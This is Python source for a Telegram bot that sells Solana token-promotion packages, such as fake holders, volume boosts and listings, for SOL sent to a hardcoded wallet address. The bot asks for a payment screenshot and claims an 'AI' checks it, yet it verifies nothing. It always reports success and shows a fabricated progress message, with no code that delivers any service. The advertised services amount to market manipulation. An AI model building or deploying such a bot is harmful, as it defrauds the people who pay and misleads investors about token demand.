import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
    ConversationHandler
)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
CONTRACT, PAYMENT, SCREENSHOT = range(3)
# Replace the DEPOSIT_ADDRESS line with:
DEPOSIT_ADDRESS = os.getenv("DEPOSIT_ADDRESS", "FCPH83KwB41po3WbUt4LZBETrtUPeznQ49mDBtT9AwCM")
# Payment options
PAYMENT_OPTIONS = {
    "option1": {"sol": 0.8, "holders": 50, "text": "0.8 SOL → 50 Holders"},
    "option2": {"sol": 1.8, "holders": 400, "text": "1.8 SOL → 400 Holders"},
    "option3": {"sol": 3.0, "holders": 700, "text": "3 SOL → 700 Holders"},
    "option4": {"sol": 3.8, "holders": 1000, "text": "3.8 SOL → 1000 Holders"},
    "option5": {"sol": 6.0, "text": "6 SOL → DEX Feature"},
    "option6": {"sol": 8.0, "text": "8 SOL → CoinSite Listing"}
}

# Bot commands
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Initial command to start the bot"""
    await update.message.reply_text(
        "🚀 Welcome to TokenBot! Get 1000+ investors in under 1 hour!\n\n"
        "📈 Services include:\n"
        "- SOL Increase Holders\n"
        "- SOL MultiSender\n"
        "- SOL Create Token\n"
        "- Anti-MEV Volume Bot\n"
        "- ↑MAKERS Increase\n\n"
        "To begin, please provide:\n"
        "1. Contract Address\n"
        "2. Token Name\n\n"
        "Format: \n<code>CONTRACT_ADDRESS\nTOKEN_NAME</code>",
        parse_mode="HTML"
    )
    return CONTRACT

async def contract_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle contract address and token name"""
    try:
        user_input = update.message.text.split('\n')
        if len(user_input) < 2:
            raise ValueError("Invalid format")
            
        context.user_data['contract'] = user_input[0].strip()
        context.user_data['token'] = user_input[1].strip()
        
        keyboard = [
            [InlineKeyboardButton(opt['text'], callback_data=opt_id)]
            for opt_id, opt in PAYMENT_OPTIONS.items()
        ]
        
        # Add configuration options
        config_text = (
            "⚙️ Configuration Applied:\n"
            "• RPC: Custom (15 ms)\n"
            "• Buy Amount: Fixed SOL\n"
            "• DEX: Raydium/Pump.fun\n"
            "• Jito Priority: 0.0001 SOL\n"
            "• Anti-MEV: Enabled\n"
            "• Wallet Generation: Automatic\n\n"
            "✅ Ready to increase holders!"
        )
        
        await update.message.reply_text(
            f"✅ Received {context.user_data['token']} contract!\n\n"
            f"{config_text}\n\n"
            "Choose a package:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return PAYMENT
    except Exception as e:
        logger.error(f"Contract error: {e}")
        await update.message.reply_text(
            "❌ Invalid format. Please send:\n"
            "<code>CONTRACT_ADDRESS\nTOKEN_NAME</code>\n\n"
            "Example:\n<code>5H5xeKUt1wh5SE8hSJbnh9tsdVgZrUrbGffQjD9HTE9E\nMYTOKEN</code>",
            parse_mode="HTML"
        )
        return CONTRACT

async def payment_option(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle payment option selection"""
    query = update.callback_query
    await query.answer()
    option = query.data
    context.user_data['option'] = option
    opt_data = PAYMENT_OPTIONS[option]
    
    # Create description based on option
    if option == "option5":
        description = "• DexScreener featuring\n• Bonding curve optimization\n• Pump.fun token boost"
    elif option == "option6":
        description = "• CoinMarketCap listing\n• DexTools promotion\n• CoinTelegraph feature\n• Raydium spotlight"
    else:
        description = f"• {opt_data['holders']} new holders\n• Anti-MEV protection\n• Volume boost"
    
    await query.edit_message_text(
        f"💎 Package Selected: {opt_data['text']}\n\n"
        f"✨ Benefits:\n{description}\n\n"
        f"💳 Send exactly {opt_data['sol']} SOL to:\n"
        f"<code>{DEPOSIT_ADDRESS}</code>\n\n"
        "🚀 After payment:\n"
        "1. Take screenshot of transaction\n"
        "2. Send it to this chat\n"
        "3. Click 'Confirm Payment'\n\n"
        "⚡️ Note: Our AI verifies payments in 2 minutes",
        parse_mode="HTML"
    )
    return SCREENSHOT

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle screenshot submission"""
    if update.message.photo:
        context.user_data['screenshot_id'] = update.message.photo[-1].file_id
        
        keyboard = [[InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm")]]
        
        await update.message.reply_text(
            "📸 Screenshot received! AI verification started...\n\n"
            "Click below to complete:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text("⚠️ Please send a clear screenshot of your transaction")
    return SCREENSHOT

async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle payment confirmation"""
    query = update.callback_query
    await query.answer()
    
    # Get user data
    opt_data = PAYMENT_OPTIONS[context.user_data['option']]
    token = context.user_data['token']
    contract = context.user_data['contract']
    
    # Create service activation message
    if context.user_data['option'] == "option5":
        services = (
            "✅ DexScreener featuring\n"
            "✅ Bonding curve optimization\n"
            "✅ Pump.fun token boost\n"
            "✅ 250+ new holders"
        )
    elif context.user_data['option'] == "option6":
        services = (
            "✅ CoinMarketCap submission\n"
            "✅ DexTools promotion\n"
            "✅ CoinTelegraph feature\n"
            "✅ Raydium spotlight\n"
            "✅ 500+ new holders"
        )
    else:
        services = (
            f"✅ {opt_data['holders']} holder generation\n"
            "✅ Anti-MEV bots enabled\n"
            "✅ Volume boost (same block)\n"
            "✅ MultiSender deployment"
        )
    
    message = (
        f"🔍 Verification successful! Activating {token} services...\n\n"
        f"{services}\n\n"
        "⏱️ Estimated completion: 15-45 minutes\n\n"
        "📊 Real-time monitoring:\n"
        f"- Contract: {contract[:12]}...{contract[-6:]}\n"
        "- Status: Processing transactions\n"
        "- Wallets generated: 0/50\n"
        "- Holders added: 0\n\n"
        "You'll receive completion report soon!"
    )
    
    await query.edit_message_text(message)
    
    # Reset user data
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation"""
    await update.message.reply_text('Operation cancelled.')
    context.user_data.clear()
    return ConversationHandler.END

def main() -> None:
    """Run the bot"""
    # Get Telegram token from environment
    token = os.getenv("TELEGRAM_TOKEN")
    if not token:
        raise ValueError("TELEGRAM_TOKEN environment variable not set")
    
    # Create application
    application = Application.builder().token(token).build()

    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CONTRACT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, contract_info)
            ],
            PAYMENT: [
                CallbackQueryHandler(payment_option)
            ],
            SCREENSHOT: [
                MessageHandler(filters.PHOTO, screenshot),
                CallbackQueryHandler(confirm_payment, pattern='^confirm$')
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    application.add_handler(conv_handler)
    
    # Start bot
    application.run_polling()

if __name__ == '__main__':
    main()
